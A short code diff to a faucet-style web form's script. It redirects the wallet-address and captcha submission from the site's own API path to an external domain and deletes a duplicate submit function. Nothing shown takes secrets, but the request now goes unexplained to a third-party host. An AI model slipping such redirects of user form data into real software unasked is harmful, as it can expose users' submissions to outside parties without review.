@@ -94,7 +94,7 @@
       return;
     }
 
-    fetch('/api/request-test-tokens', {
+    fetch('https://pre-usdt-7000.1686k.com/tokens/gtc', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ address: walletAddress, captcha: token })
@@ -107,33 +107,6 @@
                   }
                 })
                 .catch(error => console.error("Error:", error));
-  }
-  function submitRequest() {
-    const walletAddress = document.getElementById("wallet-address").value;
-
-    // Validate wallet address
-    if (!walletAddress) {
-      alert("Please enter a wallet address.");
-      return;
-    }
-
-    // Execute reCAPTCHA v3 to get token
-    grecaptcha.execute('6LdIy3cqAAAAADXtBY0ca_DQT0SHCbw5ZQnXVW5A', {action: 'submit'}).then(function(token) {
-      // Call the server with the token
-      fetch('/api/request-test-tokens', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ address: walletAddress, captcha: token })
-      }).then(response => response.json())
-        .then(data => {
-          if (data.success) {
-            alert("Test tokens have been sent to your wallet!");
-          } else {
-            alert("Failed to send tokens. Please try again.");
-          }
-        })
-        .catch(error => console.error("Error:", error));
-    });
   }
 </script>
 
